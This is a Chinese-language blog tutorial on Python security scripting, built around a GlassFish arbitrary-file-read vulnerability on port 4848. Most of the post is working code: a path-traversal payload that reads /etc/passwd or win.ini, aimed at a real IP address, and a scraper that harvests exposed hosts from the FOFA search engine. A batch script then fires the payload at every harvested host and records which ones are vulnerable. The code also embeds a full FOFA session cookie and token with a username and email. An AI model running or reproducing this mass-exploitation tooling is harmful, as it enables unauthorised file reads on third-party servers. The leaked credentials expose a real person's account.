---
title: "批量Fofa&POC验证&SRC提取" # 文章标题.
date: 2023-05-29
draft: false
tags: ["安全开发"]
categories: ["Python"]
---

# 批量Fofa&POC验证&SRC提取

![Python安全开发](../Python安全开发.png)

## 漏洞POC验证脚本

GlassFish 任意文件读取漏洞，4848端口是GlassFish管理中心。

漏洞验证的poc为：`https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`，如果是`Windows`就是`/windows/win.ini`，然后在`fofa`上搜索相应的关键字（中间件+端口+国家）

![fofa搜索](./fofa搜索.png)

根据url构建poc（分别为Windows和Linux的poc）

```python
import requests
def glassfish_check(url):
    headers = {
        'accept': 'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'zh-CN,zh;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
        'Connection': 'close'
    }
    payload_linux = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
    payload_windows = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini"
    data_linux = requests.get(url + payload_linux, headers=headers)
    data_windows = requests.get(url+payload_windows)
    status_linux = data_linux.status_code
    status_windows = data_windows.status_code
    # 根据状态码的返回来判断漏洞是否存在
    if status_linux == 200:
        print("glassfish任意文件读取漏洞存在,Linux操作系统")
        print(data_linux.text)
    elif status_windows == 200:
        print("glassfish任意文件读取漏洞存在,Windows操作系统")
        print(data_windows.text)
    else:
        print("glassfish任意文件读取漏洞不存在")

if __name__ == '__main__':
    # 可以进入fofa网址，搜索app="glassfish" && port="4848"，找到可能存在漏洞的网站。
    url = "http://125.26.6.178:4848/"
    glassfish_check(url)
```

## Fofa搜索结果批量采集脚本

1. 获取到可能存在漏洞的IP地址信息（借助fofa等黑暗引擎搜索）（爬虫）
2. 将爬虫的网页信息通过正则表达式筛选出IP
3. 批量请求地址信息，根据状态码判断漏洞是否存在（单/多线程）

观察`fofa`的`url`：`https://fofa.info/result?qbase64=ImdsYXNzZmlzaCIgJiYgcG9ydD0iNDg0OCI=`

qbase64的参数就是要查询的中间件和端口号，是通过base64编码得到的。

![base64解码](./base64解码.png)

查看第二页的内容，观察url（页数为page，页数显示内容的条数为`page_size`）：

`https://fofa.info/result?qbase64=ImdsYXNzZmlzaCIgJiYgcG9ydD0iNDg0OCI%3D&page=2&page_size=10`

为了更加方便的进行IP地址的筛选，需要使用`xpath`对IP进行筛选。

1. 安装`lxml`去筛选返回`html`中的有用的IP信息
2. 查看要筛选的ip地址在html中的位置

`<span class="hsxa-host"><a href="https://183.89.152.205:4848" target="_blank">https://183.89.152.205:4848<i class="iconfont icon-link"></i></a></span>`

查看IP地址的位置后，写出xpath：`//span[@class="hsxa-host"]/a[@target="_blank"]/@href`

```python
import requests,base64
from lxml import etree # pip install lxml -i https://pypi.tuna.tsinghua.edu.cn/simple
# 加入Cookie和User-Agent
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
    "Cookie":"_ga=GA1.1.1053511910.1692083776; fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MzIxODM0LCJtaWQiOjEwMDE4MzU3OSwidXNlcm5hbWUiOiJBZGFMb3ZlIiwiZXhwIjoxNjkyMzQzNjA5fQ.5YsQXMEcgAyiXWj92glahmQEWS84NL6sPEP2IyxbsLw8kXC9X9jO3RrPNo1EtPwPedxi26o0M1GPUzmIgxgu0g; __fcd=Mdc669OeYxeocBnUakQnpPbt; isRedirectLang=1; is_flag_login=0; befor_router=; is_mobile=pc; Hm_lvt_19b7bde5627f2f57f67dfb76eedcf989=1692083776,1692092036,1692146739; baseShowChange=false; viewOneHundredData=false; user=%7B%22id%22%3A321834%2C%22mid%22%3A100183579%2C%22is_admin%22%3Afalse%2C%22username%22%3A%22AdaLove%22%2C%22nickname%22%3A%22AdaLove%22%2C%22email%22%3A%22timingym%40163.com%22%2C%22avatar_medium%22%3A%22https%3A%2F%2Fnosec.org%2Fmissing.jpg%22%2C%22avatar_thumb%22%3A%22https%3A%2F%2Fnosec.org%2Fmissing.jpg%22%2C%22key%22%3A%22ba03df83f02ef9528124b4bb79febf7e%22%2C%22category%22%3A%22user%22%2C%22rank_avatar%22%3A%22%22%2C%22rank_level%22%3A0%2C%22rank_name%22%3A%22%E6%B3%A8%E5%86%8C%E7%94%A8%E6%88%B7%22%2C%22company_name%22%3A%22AdaLove%22%2C%22coins%22%3A0%2C%22can_pay_coins%22%3A0%2C%22fofa_point%22%3A0%2C%22credits%22%3A1%2C%22expiration%22%3A%22-%22%2C%22login_at%22%3A0%2C%22data_limit%22%3A%7B%22web_query%22%3A300%2C%22web_data%22%3A3000%2C%22api_query%22%3A0%2C%22api_data%22%3A0%7D%2C%22expiration_notice%22%3Afalse%2C%22remain_giveaway%22%3A0%2C%22fpoint_upgrade%22%3Afalse%7D; Hm_lpvt_19b7bde5627f2f57f67dfb76eedcf989=1692146801; _ga_9GWBD260K9=GS1.1.1692146739.3.1.1692146801.0.0.0"
}
url = "https://fofa.info/result?qbase64="
search_data = b'"glassfish" && port="4848"'
base64_encode_data = base64.b64encode(search_data).decode()
for page in range(1,3):
    urls = url+base64_encode_data+"&page="+str(page)+"&page_size=10" # page=2
    html = requests.get(urls, headers=headers).content
    soup = etree.HTML(html).xpath('//span[@class="hsxa-host"]/a[@target="_blank"]/@href')
    # 通过join函数连接字符串数组。将字符串、元组、列表中的元素以指定的字符(分隔符)
    # 连接生成一个新的字符串(这里以\n来连接生成新的字符串)
    # 注意:原来是列表的形式，现在是字符串的形式
    ip_data = '\n'.join(soup)
    with open("ip.txt","a+") as f:
        f.write(ip_data+'\n')
        f.close()
```

## 漏洞POC批量验证脚本

有了上面的内容，我们可以将POC总结起来，完成批量的POC扫描，进行漏洞探测。

```python
import sys

import requests,base64
from lxml import etree # pip install lxml -i https://pypi.tuna.tsinghua.edu.cn/simple
# 加入Cookie和User-Agent
def fofa_search(search_data, page):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
        "Cookie":"_ga=GA1.1.1053511910.1692083776; fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MzIxODM0LCJtaWQiOjEwMDE4MzU3OSwidXNlcm5hbWUiOiJBZGFMb3ZlIiwiZXhwIjoxNjkyMzQzNjA5fQ.5YsQXMEcgAyiXWj92glahmQEWS84NL6sPEP2IyxbsLw8kXC9X9jO3RrPNo1EtPwPedxi26o0M1GPUzmIgxgu0g; __fcd=Mdc669OeYxeocBnUakQnpPbt; isRedirectLang=1; is_flag_login=0; befor_router=; is_mobile=pc; Hm_lvt_19b7bde5627f2f57f67dfb76eedcf989=1692083776,1692092036,1692146739; baseShowChange=false; viewOneHundredData=false; user=%7B%22id%22%3A321834%2C%22mid%22%3A100183579%2C%22is_admin%22%3Afalse%2C%22username%22%3A%22AdaLove%22%2C%22nickname%22%3A%22AdaLove%22%2C%22email%22%3A%22timingym%40163.com%22%2C%22avatar_medium%22%3A%22https%3A%2F%2Fnosec.org%2Fmissing.jpg%22%2C%22avatar_thumb%22%3A%22https%3A%2F%2Fnosec.org%2Fmissing.jpg%22%2C%22key%22%3A%22ba03df83f02ef9528124b4bb79febf7e%22%2C%22category%22%3A%22user%22%2C%22rank_avatar%22%3A%22%22%2C%22rank_level%22%3A0%2C%22rank_name%22%3A%22%E6%B3%A8%E5%86%8C%E7%94%A8%E6%88%B7%22%2C%22company_name%22%3A%22AdaLove%22%2C%22coins%22%3A0%2C%22can_pay_coins%22%3A0%2C%22fofa_point%22%3A0%2C%22credits%22%3A1%2C%22expiration%22%3A%22-%22%2C%22login_at%22%3A0%2C%22data_limit%22%3A%7B%22web_query%22%3A300%2C%22web_data%22%3A3000%2C%22api_query%22%3A0%2C%22api_data%22%3A0%7D%2C%22expiration_notice%22%3Afalse%2C%22remain_giveaway%22%3A0%2C%22fpoint_upgrade%22%3Afalse%7D; Hm_lpvt_19b7bde5627f2f57f67dfb76eedcf989=1692146801; _ga_9GWBD260K9=GS1.1.1692146739.3.1.1692146801.0.0.0"
    }
    url = "https://fofa.info/result?qbase64="
    # search_data = search_data
    base64_encode_data = base64.b64encode(search_data.encode(encoding="UTF-8")).decode()
    print(base64_encode_data)
    for page in range(1,page+1):
        urls = url+base64_encode_data+"&page="+str(page)+"&page_size=10" # page=2
        print(urls)
        html = requests.get(urls, headers=headers).content
        soup = etree.HTML(html).xpath('//span[@class="hsxa-host"]/a[@target="_blank"]/@href')
        # 通过join函数连接字符串数组。将字符串、元组、列表中的元素以指定的字符(分隔符)
        # 连接生成一个新的字符串(这里以\n来连接生成新的字符串)
        # 注意:原来是列表的形式，现在是字符串的形式
        ip_data = '\n'.join(soup)
        with open("ip.txt","a+") as f:
            f.write(ip_data+'\n')
            f.close()

def glassfish_check():
    headers = {
        'accept': 'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'zh-CN,zh;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
        'Connection': 'close'
    }
    payload_linux = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
    payload_windows = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini"
    for url in open("ip.txt"):
        # 获取请求后的返回源代码
        data_linux = requests.get(url + payload_linux, headers=headers)
        data_windows = requests.get(url + payload_windows, headers=headers)
        # 获取请求后的返回状态码
        status_linux = data_linux.status_code
        status_windows = data_windows.status_code
        print("check-->"+url)
        with open("vuln.txt","a+",encoding="UTF-8") as f:
            # 根据状态码的返回来判断漏洞是否存在
            if status_linux == 200:
                f.write(url+"glassfish任意文件读取漏洞存在,Linux操作系统")
                # print(data_linux.text)
            elif status_windows == 200:
                f.write(url+"glassfish任意文件读取漏洞存在,Windows操作系统")
                # print(data_windows.text)
            else:
                print("glassfish任意文件读取漏洞不存在")

if __name__ == '__main__':
    search_data = sys.argv[1]
    page = sys.argv[2]
    fofa_search(search_data, int(page))
    glassfish_check()
```

## 教育SRC报告平台信息批量提取

通过标题的爬取，然后通过百度搜索获取对应的域名，再进行信息搜集，最终进行渗透。